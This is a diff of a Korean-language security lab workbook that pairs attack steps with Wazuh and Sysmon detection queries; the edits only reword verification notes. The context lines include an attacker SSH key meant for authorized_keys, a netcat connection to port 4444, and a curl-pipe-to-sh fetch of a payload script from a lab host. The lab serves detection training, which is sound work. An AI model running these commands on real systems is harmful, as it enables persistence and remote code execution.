@@ -50,7 +50,7 @@ sed는 텍스트에서 지정한 범위를 출력하거나 변환한다. -n은 �
 
 sed -n '/<syscheck>/,/<\/syscheck>/p' \
 /var/ossec/etc/ossec.conf
-확인: disabled가 no인지, 필요한 directories와 ignore가 무엇인지 확인한다. 파일을 수정하는 명령이 아니다.
+확인: disabled가 no인지 확인하고, directories의 감시 경로와 ignore의 제외 조건을 읽는다.
 
 [C09-08] kt66-bastion · SSH로 접속한 ccc 셸
 sudo -l은 현재 사용자의 허용 명령을 표시한다. ls -l은 파일 소유자·권한·크기를 읽는다.
@@ -120,7 +120,7 @@ ssh-keygen -t ed25519 -N '' \
 -C book09@attacker -f ~/book09/book09_key
 ssh-keygen -lf ~/book09/book09_key.pub
 cat ~/book09/book09_key.pub
-확인: 새 키 지문과 공개 키 한 줄을 기록한다. 개인 키는 공격자 VM에만 둔다. 공개 키 끝 주석은 작성자가 정할 수 있으므로 신원 증명이 아니다.
+확인: 새 키 지문과 공개 키 한 줄을 기록한다. 개인 키는 공격자 VM에만 둔다. 공개 키 끝 주석은 작성자가 정한 이름이다. 키 소유자는 등록 내역과 지문으로 확인한다.
 
 [C09-15] kt66-bastion · root 관리 셸
 기존 SSH 키 파일의 권한과 백업 대상의 상태를 기록한다.
@@ -178,7 +178,7 @@ ccc@192.168.0.107 'hostname; id'
 키 목록 변경 경보를 찾는다.
 
 agent.name: "bastion" AND rule.groups: "syscheck" AND syscheck.path: "/home/ccc/.ssh/authorized_keys"
-확인: 키 추가와 원상복구의 modified 2건을 구분한다. FIM은 키로 로그인했는지까지 판정하지 않는다.
+확인: 키 추가와 원상복구의 modified 2건을 구분한다. 키를 사용한 로그인은 sshd의 인증 기록과 지문에서 확인한다.
 
 [Q09-04] Windows · Discover · wazuh-alerts-*
 공개 키 인증 성공을 원문 문구까지 제한해 찾는다.
@@ -230,7 +230,7 @@ cron이 없을 때만 bastion root 셸에서 설치한다. apt-get update는 목
 apt-get update
 apt-get install -y --no-install-recommends cron
 command -v cron
-확인: 설치 오류가 없고 /usr/sbin/cron이 나온다. 제시한 사례에서는 이 준비가 필요했다. 패키지 설치가 서비스 실행을 보장하지는 않는다.
+확인: 설치 오류가 없고 /usr/sbin/cron이 나온다. 제시한 사례에서는 이 준비가 필요했다. 설치 후 서비스의 실행 상태도 확인한다.
 
 [C09-26] 공격자 VM · att 셸
 python3는 파이썬 실행기이다. 실습용 하위 디렉터리가 없을 때만 mkdir를 실행한다.
@@ -435,7 +435,7 @@ sudo journalctl -t sysmon \
 --since "2026-11-03 07:52:25" \
 --until "2026-11-03 07:52:28" --no-pager | \
 grep -F '172438'
-확인: 이 기록의 EventID=1, Image=/usr/bin/nc.openbsd, CommandLine=nc -N 192.168.0.108 4444, ParentProcessId를 읽는다. 이벤트 1은 프로세스 생성이지 네트워크 접속 성공 이벤트가 아니다.
+확인: EventID=1은 프로세스 생성 기록이다. Image=/usr/bin/nc.openbsd, CommandLine=nc -N 192.168.0.108 4444, ParentProcessId를 읽는다. 연결 성공 여부는 대기 창의 연결 표시와 명령 응답을 대조한다.
 
 [C09-49] 공격자 VM · att 셸
 기존 a.sh가 없는지 먼저 확인한다.
@@ -462,13 +462,13 @@ http://192.168.0.108:8000/a.sh
 curl -fsS --max-time 5 \
 http://192.168.0.108:8000/a.sh | sh
 printf "curl and sh status: %s\n" "${PIPESTATUS[*]}"
-확인: book09-payload user=ccc host=ccc와 상태 0 0을 확인한다. sh의 0만으로 curl 성공을 대신하지 않는다.
+확인: book09-payload user=ccc host=ccc와 상태 0 0을 확인한다. 앞의 값은 curl, 뒤의 값은 sh의 종료 코드이므로 두 값을 각각 읽는다.
 
 [Q09-08] Windows · Discover · wazuh-alerts-*
 호스트에서 실행한 curl 경보를 찾고 인자 전체를 읽는다.
 
 agent.name: "kt66-host" AND rule.groups: "audit_command" AND data.audit.execve.a0: "curl"
-확인: 사례 조회 구간 2건은 사전 본문 조회와 파이프 실행이다. 같은 URL을 조회했다고 모두 셸 실행은 아니다.
+확인: 사례 조회 구간의 2건은 사전 본문 조회와 파이프 실행 요청이다. 각 HTTP 요청을 셸 실행 기록과 대조해 용도를 구분한다.
 
 [Q09-09] Windows · Discover · wazuh-alerts-*
 사례에 제시한 파이프 실행의 부모와 직접 자식을 연결한다.
